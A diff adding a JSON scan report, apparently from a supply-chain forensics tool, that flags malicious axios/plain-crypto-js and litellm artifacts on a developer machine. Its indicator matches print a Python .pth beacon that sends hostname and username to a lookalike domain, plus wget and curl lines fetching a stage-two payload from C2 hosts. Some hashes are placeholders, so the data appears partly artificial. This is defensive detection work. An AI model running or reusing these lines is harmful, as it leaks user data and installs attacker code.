@@ -1,0 +1,701 @@
+{
+  "meta": {
+    "hostname": "192.168.64.3:22",
+    "collected_at": "2026-04-08T16:35:50Z",
+    "duration_ms": 322,
+    "version": "Ardras-MacBook-Air.local",
+    "total_artifacts": 23,
+    "critical_count": 14,
+    "high_count": 1,
+    "campaign_count": 2
+  },
+  "campaigns": [
+    {
+      "id": "axios-unc1069",
+      "description": "UNC1069 (suspected DPRK) compromised npm maintainer account jasonsaayman and published malicious axios versions with a plain-crypto-js dependency whose postinstall hook deployed a cross-platform RAT. Dropper deleted itself and swapped package.json after execution. March 2026.",
+      "kind_counts": [
+        {
+          "kind": "cache_hit",
+          "count": 1
+        },
+        {
+          "kind": "install_log",
+          "count": 4
+        },
+        {
+          "kind": "lockfile_entry",
+          "count": 2
+        },
+        {
+          "kind": "shell_history",
+          "count": 4
+        }
+      ],
+      "total_artifacts": 11,
+      "confidence_pct": 80
+    },
+    {
+      "id": "litellm-teampcp",
+      "description": "TeamPCP compromised Trivy GitHub Action in LiteLLM's CI pipeline, stole PyPI publish token, and published litellm versions containing a malicious litellm_init.pth file that executes on every Python startup via the .pth import_exec mechanism. March 2026.",
+      "kind_counts": [
+        {
+          "kind": "pth_file",
+          "count": 2
+        },
+        {
+          "kind": "shell_history",
+          "count": 3
+        }
+      ],
+      "total_artifacts": 5,
+      "confidence_pct": 40
+    }
+  ],
+  "chains": [
+    {
+      "id": "78dbc3d7d8fd8359fa2294e4f5ad247f",
+      "kind": "lockfile_entry",
+      "identity": "axios@1.14.1",
+      "severity": "critical",
+      "source": "npm/lockfile",
+      "ioc_matches": [
+        {
+          "indicator_id": "axios-unc1069-pkg-axios-1.14.1",
+          "indicator_type": "package",
+          "matched_value": "axios@1.14.1",
+          "description": "Malicious npm package axios@1.14.1",
+          "campaign": "axios-unc1069"
+        }
+      ],
+      "children": [
+        {
+          "id": "a46d6738442947c36a9a4fe375ff2710",
+          "kind": "shell_history",
+          "identity": "axios@1.14.1",
+          "severity": "critical",
+          "source": "os/shell/bash",
+          "ioc_matches": [
+            {
+              "indicator_id": "axios-unc1069-pkg-axios-1.14.1",
+              "indicator_type": "package",
+              "matched_value": "axios@1.14.1",
+              "description": "Malicious npm package axios@1.14.1",
+              "campaign": "axios-unc1069"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "45b77f3bf007796daef2431bb6f5d164",
+      "kind": "pth_file",
+      "identity": "litellm_init.pth",
+      "severity": "critical",
+      "source": "pypi/pth",
+      "ioc_matches": [
+        {
+          "indicator_id": "teampcp-pth-litellm-init",
+          "indicator_type": "pth",
+          "matched_value": "litellm_init.pth",
+          "description": "Malicious .pth file injected into system site-packages; executes on every Python startup via import_exec line",
+          "campaign": "litellm-teampcp"
+        },
+        {
+          "indicator_id": "teampcp-domain-litellm-cloud",
+          "indicator_type": "domain",
+          "matched_value": "import sys; import os; import threading; _t=threading.Thread(target=lambda:__import__('urllib.request',fromlist=['urlopen']).urlopen('https://models.litellm.cloud/beacon?h='+__import__('socket').gethostname()+'\u0026u='+os.environ.get('USER','?')),daemon=True); _t.start()",
+          "description": "TeamPCP C2 / exfil domain masquerading as legitimate LiteLLM infrastructure",
+          "campaign": "litellm-teampcp"
+        }
+      ],
+      "children": [
+        {
+          "id": "2c17d74ddae91336cd2673cab6f4a9bd",
+          "kind": "shell_history",
+          "identity": "litellm@1.82.7",
+          "severity": "critical",
+          "source": "os/shell/bash",
+          "ioc_matches": [
+            {
+              "indicator_id": "litellm-teampcp-pkg-litellm-1.82.7",
+              "indicator_type": "package",
+              "matched_value": "litellm@1.82.7",
+              "description": "Malicious pypi package litellm@1.82.7",
+              "campaign": "litellm-teampcp"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "67861f43352da4b5700b8a9e0555eb87",
+      "kind": "lockfile_entry",
+      "identity": "plain-crypto-js@4.2.1",
+      "severity": "critical",
+      "source": "npm/lockfile",
+      "ioc_matches": [
+        {
+          "indicator_id": "axios-unc1069-pkg-plain-crypto-js-4.2.1",
+          "indicator_type": "package",
+          "matched_value": "plain-crypto-js@4.2.1",
+          "description": "Malicious npm package plain-crypto-js@4.2.1",
+          "campaign": "axios-unc1069"
+        }
+      ],
+      "children": [
+        {
+          "id": "1f4d2b40fb26b8917b1b7ef68f698bf3",
+          "kind": "cache_hit",
+          "identity": "plain-crypto-js@4.2.1",
+          "severity": "critical",
+          "source": "npm/cache",
+          "ioc_matches": [
+            {
+              "indicator_id": "axios-unc1069-pkg-plain-crypto-js-4.2.1",
+              "indicator_type": "package",
+              "matched_value": "plain-crypto-js@4.2.1",
+              "description": "Malicious npm package plain-crypto-js@4.2.1",
+              "campaign": "axios-unc1069"
+            }
+          ]
+        },
+        {
+          "id": "c1e2e46c338794aec907a743e262f8f1",
+          "kind": "install_log",
+          "identity": "plain-crypto-js@4.2.1",
+          "severity": "critical",
+          "source": "npm/logs",
+          "ioc_matches": [
+            {
+              "indicator_id": "axios-unc1069-pkg-plain-crypto-js-4.2.1",
+              "indicator_type": "package",
+              "matched_value": "plain-crypto-js@4.2.1",
+              "description": "Malicious npm package plain-crypto-js@4.2.1",
+              "campaign": "axios-unc1069"
+            }
+          ]
+        },
+        {
+          "id": "d073a9059e92f23ca2333dce7272c5b0",
+          "kind": "install_log",
+          "identity": "plain-crypto-js@4.2.1",
+          "severity": "critical",
+          "source": "npm/logs",
+          "ioc_matches": [
+            {
+              "indicator_id": "axios-unc1069-pkg-plain-crypto-js-4.2.1",
+              "indicator_type": "package",
+              "matched_value": "plain-crypto-js@4.2.1",
+              "description": "Malicious npm package plain-crypto-js@4.2.1",
+              "campaign": "axios-unc1069"
+            }
+          ]
+        },
+        {
+          "id": "5d57083c1f72a9f373cfee54e5ced495",
+          "kind": "install_log",
+          "identity": "plain-crypto-js@4.2.1",
+          "severity": "critical",
+          "source": "npm/logs",
+          "ioc_matches": [
+            {
+              "indicator_id": "axios-unc1069-pkg-plain-crypto-js-4.2.1",
+              "indicator_type": "package",
+              "matched_value": "plain-crypto-js@4.2.1",
+              "description": "Malicious npm package plain-crypto-js@4.2.1",
+              "campaign": "axios-unc1069"
+            }
+          ]
+        },
+        {
+          "id": "318d6b04c3a2d25cf64ba336d1c942f1",
+          "kind": "install_log",
+          "identity": "plain-crypto-js@4.2.1",
+          "severity": "critical",
+          "source": "npm/logs",
+          "ioc_matches": [
+            {
+              "indicator_id": "axios-unc1069-pkg-plain-crypto-js-4.2.1",
+              "indicator_type": "package",
+              "matched_value": "plain-crypto-js@4.2.1",
+              "description": "Malicious npm package plain-crypto-js@4.2.1",
+              "campaign": "axios-unc1069"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "artifacts": [
+    {
+      "id": "1f4d2b40fb26b8917b1b7ef68f698bf3",
+      "kind": "cache_hit",
+      "ecosystem": "npm",
+      "severity": "critical",
+      "path": "/home/ardra/.npm/_cacache",
+      "timestamp": "2025-03-25T10:40:00Z",
+      "inferred": false,
+      "package_name": "plain-crypto-js",
+      "package_version": "4.2.1",
+      "integrity_hash": "sha512-a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2==",
+      "ioc_matches": [
+        {
+          "indicator_id": "axios-unc1069-pkg-plain-crypto-js-4.2.1",
+          "indicator_type": "package",
+          "matched_value": "plain-crypto-js@4.2.1",
+          "description": "Malicious npm package plain-crypto-js@4.2.1",
+          "campaign": "axios-unc1069"
+        }
+      ],
+      "linked_ids": [
+        "67861f43352da4b5700b8a9e0555eb87"
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/cache"
+    },
+    {
+      "id": "c1e2e46c338794aec907a743e262f8f1",
+      "kind": "install_log",
+      "ecosystem": "npm",
+      "severity": "critical",
+      "path": "/home/ardra/.npm/_logs/2026-03-15T09_23_11_482Z-debug-0.log",
+      "raw_content_b64": "NyBpbmZvIGluc3RhbGwgcGxhaW4tY3J5cHRvLWpzQDQuMi4x",
+      "inferred": false,
+      "package_name": "plain-crypto-js",
+      "package_version": "4.2.1",
+      "ioc_matches": [
+        {
+          "indicator_id": "axios-unc1069-pkg-plain-crypto-js-4.2.1",
+          "indicator_type": "package",
+          "matched_value": "plain-crypto-js@4.2.1",
+          "description": "Malicious npm package plain-crypto-js@4.2.1",
+          "campaign": "axios-unc1069"
+        }
+      ],
+      "linked_ids": [
+        "67861f43352da4b5700b8a9e0555eb87"
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/logs"
+    },
+    {
+      "id": "d073a9059e92f23ca2333dce7272c5b0",
+      "kind": "install_log",
+      "ecosystem": "npm",
+      "severity": "critical",
+      "path": "/home/ardra/.npm/_logs/2026-03-15T09_23_11_482Z-debug-0.log",
+      "raw_content_b64": "OSBpbmZvIHJ1biBwbGFpbi1jcnlwdG8tanNANC4yLjEgcG9zdGluc3RhbGwgeyBzY3JpcHQ6ICdub2RlIGluc3RhbGwuanMnIH0=",
+      "inferred": false,
+      "package_name": "plain-crypto-js",
+      "package_version": "4.2.1",
+      "ioc_matches": [
+        {
+          "indicator_id": "axios-unc1069-pkg-plain-crypto-js-4.2.1",
+          "indicator_type": "package",
+          "matched_value": "plain-crypto-js@4.2.1",
+          "description": "Malicious npm package plain-crypto-js@4.2.1",
+          "campaign": "axios-unc1069"
+        }
+      ],
+      "linked_ids": [
+        "67861f43352da4b5700b8a9e0555eb87"
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/logs"
+    },
+    {
+      "id": "318d6b04c3a2d25cf64ba336d1c942f1",
+      "kind": "install_log",
+      "ecosystem": "npm",
+      "severity": "critical",
+      "path": "/home/ardra/.npm/_logs/2026-03-15T09_23_11_482Z-debug-0.log",
+      "raw_content_b64": "MTIgdmVyYm9zZSBzdGFjayBFcnJvcjogbWlzc2luZzogcGxhaW4tY3J5cHRvLWpzQDQuMi4xLCByZXF1aXJlZCBieSBheGlvcy1wcm9qZWN0QDEuMC4w",
+      "inferred": false,
+      "package_name": "plain-crypto-js",
+      "package_version": "4.2.1",
+      "ioc_matches": [
+        {
+          "indicator_id": "axios-unc1069-pkg-plain-crypto-js-4.2.1",
+          "indicator_type": "package",
+          "matched_value": "plain-crypto-js@4.2.1",
+          "description": "Malicious npm package plain-crypto-js@4.2.1",
+          "campaign": "axios-unc1069"
+        }
+      ],
+      "linked_ids": [
+        "67861f43352da4b5700b8a9e0555eb87"
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/logs"
+    },
+    {
+      "id": "5d57083c1f72a9f373cfee54e5ced495",
+      "kind": "install_log",
+      "ecosystem": "npm",
+      "severity": "critical",
+      "path": "/home/ardra/.npm/_logs/2026-03-15T09_23_11_482Z-debug-0.log",
+      "raw_content_b64": "MTEgd2FybiBpbnN0YWxsIHBsYWluLWNyeXB0by1qc0A0LjIuMSBwb3N0aW5zdGFsbCBleGl0ZWQgY29kZSAw",
+      "inferred": false,
+      "package_name": "plain-crypto-js",
+      "package_version": "4.2.1",
+      "ioc_matches": [
+        {
+          "indicator_id": "axios-unc1069-pkg-plain-crypto-js-4.2.1",
+          "indicator_type": "package",
+          "matched_value": "plain-crypto-js@4.2.1",
+          "description": "Malicious npm package plain-crypto-js@4.2.1",
+          "campaign": "axios-unc1069"
+        }
+      ],
+      "linked_ids": [
+        "67861f43352da4b5700b8a9e0555eb87"
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/logs"
+    },
+    {
+      "id": "78dbc3d7d8fd8359fa2294e4f5ad247f",
+      "kind": "lockfile_entry",
+      "ecosystem": "npm",
+      "severity": "critical",
+      "path": "/home/ardra/axios-project/package-lock.json",
+      "inferred": false,
+      "package_name": "axios",
+      "package_version": "1.14.1",
+      "integrity_hash": "sha512-oBkSRyQmOTic5P7X4OtMEm8LJNMFpJbTuFEo3liMg2Pvs2FQnfmqJMOV3/HuIjGXW3V5teLIrPiADqGVjPcQ==",
+      "ioc_matches": [
+        {
+          "indicator_id": "axios-unc1069-pkg-axios-1.14.1",
+          "indicator_type": "package",
+          "matched_value": "axios@1.14.1",
+          "description": "Malicious npm package axios@1.14.1",
+          "campaign": "axios-unc1069"
+        }
+      ],
+      "linked_ids": [
+        "a46d6738442947c36a9a4fe375ff2710"
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/lockfile"
+    },
+    {
+      "id": "67861f43352da4b5700b8a9e0555eb87",
+      "kind": "lockfile_entry",
+      "ecosystem": "npm",
+      "severity": "critical",
+      "path": "/home/ardra/axios-project/package-lock.json",
+      "inferred": false,
+      "package_name": "plain-crypto-js",
+      "package_version": "4.2.1",
+      "integrity_hash": "sha512-a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2==",
+      "ioc_matches": [
+        {
+          "indicator_id": "axios-unc1069-pkg-plain-crypto-js-4.2.1",
+          "indicator_type": "package",
+          "matched_value": "plain-crypto-js@4.2.1",
+          "description": "Malicious npm package plain-crypto-js@4.2.1",
+          "campaign": "axios-unc1069"
+        }
+      ],
+      "linked_ids": [
+        "1f4d2b40fb26b8917b1b7ef68f698bf3",
+        "c1e2e46c338794aec907a743e262f8f1",
+        "d073a9059e92f23ca2333dce7272c5b0",
+        "5d57083c1f72a9f373cfee54e5ced495",
+        "318d6b04c3a2d25cf64ba336d1c942f1"
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/lockfile"
+    },
+    {
+      "id": "45b77f3bf007796daef2431bb6f5d164",
+      "kind": "pth_file",
+      "ecosystem": "pypi",
+      "severity": "critical",
+      "path": "/home/ardra/.local/lib/python3.12/site-packages/litellm_init.pth",
+      "raw_content_b64": "L3Vzci9saWIvcHl0aG9uMy9kaXN0LXBhY2thZ2VzCmltcG9ydCBzeXM7IGltcG9ydCBvczsgaW1wb3J0IHRocmVhZGluZzsgX3Q9dGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9bGFtYmRhOl9faW1wb3J0X18oJ3VybGxpYi5yZXF1ZXN0Jyxmcm9tbGlzdD1bJ3VybG9wZW4nXSkudXJsb3BlbignaHR0cHM6Ly9tb2RlbHMubGl0ZWxsbS5jbG91ZC9iZWFjb24/aD0nK19faW1wb3J0X18oJ3NvY2tldCcpLmdldGhvc3RuYW1lKCkrJyZ1PScrb3MuZW52aXJvbi5nZXQoJ1VTRVInLCc/JykpLGRhZW1vbj1UcnVlKTsgX3Quc3RhcnQoKQo=",
+      "timestamp": "2026-04-01T03:08:26Z",
+      "inferred": false,
+      "package_name": "litellm_init.pth",
+      "ioc_matches": [
+        {
+          "indicator_id": "teampcp-pth-litellm-init",
+          "indicator_type": "pth",
+          "matched_value": "litellm_init.pth",
+          "description": "Malicious .pth file injected into system site-packages; executes on every Python startup via import_exec line",
+          "campaign": "litellm-teampcp"
+        },
+        {
+          "indicator_id": "teampcp-domain-litellm-cloud",
+          "indicator_type": "domain",
+          "matched_value": "import sys; import os; import threading; _t=threading.Thread(target=lambda:__import__('urllib.request',fromlist=['urlopen']).urlopen('https://models.litellm.cloud/beacon?h='+__import__('socket').gethostname()+'\u0026u='+os.environ.get('USER','?')),daemon=True); _t.start()",
+          "description": "TeamPCP C2 / exfil domain masquerading as legitimate LiteLLM infrastructure",
+          "campaign": "litellm-teampcp"
+        }
+      ],
+      "linked_ids": [
+        "2c17d74ddae91336cd2673cab6f4a9bd"
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "pypi/pth",
+      "note": "litellm_init.pth in /home/ardra/.local/lib/python3.12/site-packages: contains executable line (import/exec)"
+    },
+    {
+      "id": "65fa306c6b4fed5d7cdc598b49c5b9dc",
+      "kind": "shell_history",
+      "ecosystem": "os",
+      "severity": "critical",
+      "path": "/home/ardra/.bash_history",
+      "raw_content_b64": "aHR0cHM6Ly9tb2RlbHMubGl0ZWxsbS5jbG91ZC9iZWFjb24=",
+      "inferred": false,
+      "ioc_matches": [
+        {
+          "indicator_id": "teampcp-domain-litellm-cloud",
+          "indicator_type": "domain",
+          "matched_value": "https://models.litellm.cloud/beacon",
+          "description": "TeamPCP C2 / exfil domain masquerading as legitimate LiteLLM infrastructure",
+          "campaign": "litellm-teampcp"
+        }
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "os/shell/bash",
+      "note": "line 14: IOC match (teampcp-domain-litellm-cloud)"
+    },
+    {
+      "id": "85ddb141910e067e22f77ad4b86830af",
+      "kind": "shell_history",
+      "ecosystem": "os",
+      "severity": "critical",
+      "path": "/home/ardra/.bash_history",
+      "raw_content_b64": "d2dldCAtcSBodHRwczovL3NmcmNsYWsuY29tL3N0YWdlMiAtTyAvdG1wLy5zMg==",
+      "inferred": false,
+      "ioc_matches": [
+        {
+          "indicator_id": "unc1069-domain-sfrclak",
+          "indicator_type": "domain",
+          "matched_value": "wget -q https://sfrclak.com/stage2 -O /tmp/.s2",
+          "description": "UNC1069 C2 domain contacted by plain-crypto-js RAT dropper",
+          "campaign": "axios-unc1069"
+        }
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "os/shell/bash",
+      "note": "line 4: IOC match (unc1069-domain-sfrclak)"
+    },
+    {
+      "id": "3d8c955195e8308af32984ede8ed8aa5",
+      "kind": "shell_history",
+      "ecosystem": "os",
+      "severity": "critical",
+      "path": "/home/ardra/.bash_history",
+      "raw_content_b64": "Y3VybCAtc2sgaHR0cHM6Ly9zZnJjbGFrLmNvbS9kcm9wP2NoZWNrPTEgLW8gL2Rldi9udWxs",
+      "inferred": false,
+      "ioc_matches": [
+        {
+          "indicator_id": "unc1069-domain-sfrclak",
+          "indicator_type": "domain",
+          "matched_value": "curl -sk https://sfrclak.com/drop?check=1 -o /dev/null",
+          "description": "UNC1069 C2 domain contacted by plain-crypto-js RAT dropper",
+          "campaign": "axios-unc1069"
+        }
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "os/shell/bash",
+      "note": "line 3: IOC match (unc1069-domain-sfrclak)"
+    },
+    {
+      "id": "c3a45c65e36f8530e62647c9b3ec2009",
+      "kind": "shell_history",
+      "ecosystem": "os",
+      "severity": "critical",
+      "path": "/home/ardra/.bash_history",
+      "raw_content_b64": "Y3VybCAtQSAnbW96aWxsYS80LjAgKGNvbXBhdGlibGU7IG1zaWUgOC4wOyB3aW5kb3dzIG50IDUuMTsgdHJpZGVudC80LjApJyBodHRwczovL21vZGVscy5saXRlbGxtLmNsb3VkL2JlYWNvbg==",
+      "inferred": false,
+      "ioc_matches": [
+        {
+          "indicator_id": "unc1069-ua-msie",
+          "indicator_type": "ua",
+          "matched_value": "curl -A 'mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)' https://models.litellm.cloud/beacon",
+          "description": "Malicious user-agent string used in C2 beacon traffic",
+          "campaign": "axios-unc1069"
+        },
+        {
+          "indicator_id": "teampcp-domain-litellm-cloud",
+          "indicator_type": "domain",
+          "matched_value": "curl -A 'mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)' https://models.litellm.cloud/beacon",
+          "description": "TeamPCP C2 / exfil domain masquerading as legitimate LiteLLM infrastructure",
+          "campaign": "litellm-teampcp"
+        }
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "os/shell/bash",
+      "note": "line 10: IOC match (unc1069-ua-msie, teampcp-domain-litellm-cloud)"
+    },
+    {
+      "id": "a46d6738442947c36a9a4fe375ff2710",
+      "kind": "shell_history",
+      "ecosystem": "os",
+      "severity": "critical",
+      "path": "/home/ardra/.bash_history",
+      "raw_content_b64": "bnBtIGluc3RhbGwgYXhpb3NAMS4xNC4x",
+      "inferred": false,
+      "package_name": "axios",
+      "package_version": "1.14.1",
+      "ioc_matches": [
+        {
+          "indicator_id": "axios-unc1069-pkg-axios-1.14.1",
+          "indicator_type": "package",
+          "matched_value": "axios@1.14.1",
+          "description": "Malicious npm package axios@1.14.1",
+          "campaign": "axios-unc1069"
+        }
+      ],
+      "linked_ids": [
+        "78dbc3d7d8fd8359fa2294e4f5ad247f"
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "os/shell/bash",
+      "note": "line 2: IOC match (axios-unc1069-pkg-axios-1.14.1)"
+    },
+    {
+      "id": "2c17d74ddae91336cd2673cab6f4a9bd",
+      "kind": "shell_history",
+      "ecosystem": "os",
+      "severity": "critical",
+      "path": "/home/ardra/.bash_history",
+      "raw_content_b64": "cGlwMyBpbnN0YWxsIGxpdGVsbG09PTEuODIuNw==",
+      "inferred": false,
+      "package_name": "litellm",
+      "package_version": "1.82.7",
+      "ioc_matches": [
+        {
+          "indicator_id": "litellm-teampcp-pkg-litellm-1.82.7",
+          "indicator_type": "package",
+          "matched_value": "litellm@1.82.7",
+          "description": "Malicious pypi package litellm@1.82.7",
+          "campaign": "litellm-teampcp"
+        }
+      ],
+      "linked_ids": [
+        "45b77f3bf007796daef2431bb6f5d164"
+      ],
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "os/shell/bash",
+      "note": "line 8: IOC match (litellm-teampcp-pkg-litellm-1.82.7)"
+    },
+    {
+      "id": "7267fc885c1ed23d4302d71d2f17273b",
+      "kind": "shell_history",
+      "ecosystem": "os",
+      "severity": "high",
+      "path": "/home/ardra/.bash_history",
+      "raw_content_b64": "Y3VybCAtQSAnbW96aWxsYS80LjAgKGNvbXBhdGlibGU7IG1zaWUgOC4wOyB3aW5kb3dzIG50IDUuMSknIFw=",
+      "inferred": false,
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "os/shell/bash",
+      "note": "line 13: suspicious pattern (curl -A / wget UA / base64 decode / python network one-liner)"
+    },
+    {
+      "id": "52f44e55a847f6fd325c6043c53dfa78",
+      "kind": "install_log",
+      "ecosystem": "npm",
+      "severity": "medium",
+      "path": "/home/ardra/.npm/_logs/2026-03-15T09_23_11_482Z-debug-0.log",
+      "raw_content_b64": "MTAgdGltaW5nIGFjdGlvbjpydW4tc2NyaXB0OnBvc3RpbnN0YWxsIENvbXBsZXRlZCBpbiA4OTFtcw==",
+      "inferred": false,
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/logs"
+    },
+    {
+      "id": "e518f9531abcaa5f9ddd2308d6c5fae3",
+      "kind": "lockfile_entry",
+      "ecosystem": "npm",
+      "severity": "info",
+      "path": "/home/ardra/axios-project/package-lock.json",
+      "inferred": false,
+      "package_name": "asynckit",
+      "package_version": "0.4.0",
+      "integrity_hash": "sha512-Oei9OH4tRh0YqU3GxhX79dM/mwVgvbZJaSNaRk+bshkj0S5cfHcgYakreBjrHwatXKbz+IoIdYLxrKim2MjA==",
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/lockfile"
+    },
+    {
+      "id": "3c8ae5f1010a934bd2b9d616be735768",
+      "kind": "lockfile_entry",
+      "ecosystem": "npm",
+      "severity": "info",
+      "path": "/home/ardra/axios-project/package-lock.json",
+      "inferred": false,
+      "package_name": "combined-stream",
+      "package_version": "1.0.8",
+      "integrity_hash": "sha512-FQN4MRfuJeHf7cBbBMJFXhKSDq+2kAArBlmRBvcvFE5BB1HZKXtSFASDhdlz9zOYwxh8lDdnvmMOe/+5cdoEdg==",
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/lockfile"
+    },
+    {
+      "id": "e43f01598ae90500c2d911c2fb55ddb5",
+      "kind": "lockfile_entry",
+      "ecosystem": "npm",
+      "severity": "info",
+      "path": "/home/ardra/axios-project/package-lock.json",
+      "inferred": false,
+      "package_name": "follow-redirects",
+      "package_version": "1.15.9",
+      "integrity_hash": "sha512-gew4GsXizNgdoRyqmyfMHyAmXsZDk6mHkSxZFCzW9o4sNcNPPdRvN5T+gVlhDWW9hE6dVCVv15ZOMCaZS4hA==",
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/lockfile"
+    },
+    {
+      "id": "ed658254c87bf1a34817c597c232a3e5",
+      "kind": "lockfile_entry",
+      "ecosystem": "npm",
+      "severity": "info",
+      "path": "/home/ardra/axios-project/package-lock.json",
+      "inferred": false,
+      "package_name": "form-data",
+      "package_version": "4.0.1",
+      "integrity_hash": "sha512-tzN8e00t7Rs5/TBpFbje3a0D/+HkHlZJMpLPDhiMzz4oD2VbCDWtjYHXi0qOWZJdQjqqN3n8fRgbNnf3XjWQ==",
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/lockfile"
+    },
+    {
+      "id": "e200837d09204d0cbdc27de4ab91e9f0",
+      "kind": "lockfile_entry",
+      "ecosystem": "npm",
+      "severity": "info",
+      "path": "/home/ardra/axios-project/package-lock.json",
+      "inferred": false,
+      "package_name": "mime-db",
+      "package_version": "1.52.0",
+      "integrity_hash": "sha512-sPU4uV7dYlvtWJxwwxHD0PuihVNiE7TyAbQ5SWxDCB9mUYvOgroQOwYQQOKPJ8CIbE+1ETVlOoK1UC2nU3gfg==",
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/lockfile"
+    },
+    {
+      "id": "e259239134abce66a884262fce062993",
+      "kind": "lockfile_entry",
+      "ecosystem": "npm",
+      "severity": "info",
+      "path": "/home/ardra/axios-project/package-lock.json",
+      "inferred": false,
+      "package_name": "mime-types",
+      "package_version": "2.1.35",
+      "integrity_hash": "sha512-ZDY+bPm5zTTF+YpCrAU9nK0UjICH126C8ij4v6uMKMwFDFyYWFuFAYgp/MEQ7VHFpWMO4b/+/OtKxU3E0mCg==",
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/lockfile"
+    },
+    {
+      "id": "59ea8d97411b9206ef680166278e8015",
+      "kind": "lockfile_entry",
+      "ecosystem": "npm",
+      "severity": "info",
+      "path": "/home/ardra/axios-project/package-lock.json",
+      "inferred": false,
+      "package_name": "proxy-from-env",
+      "package_version": "1.1.0",
+      "integrity_hash": "sha512-D+zkORCbA9f1tdWRK0RaCR3GPv50cMxcrz4X8k5LTSUD1Dkw47mKJEZQNunItRTkWwgtaUSo1RVFRIG9ZXiFg==",
+      "collected_at": "2026-04-08T16:35:50Z",
+      "source": "npm/lockfile"
+    }
+  ]
+}
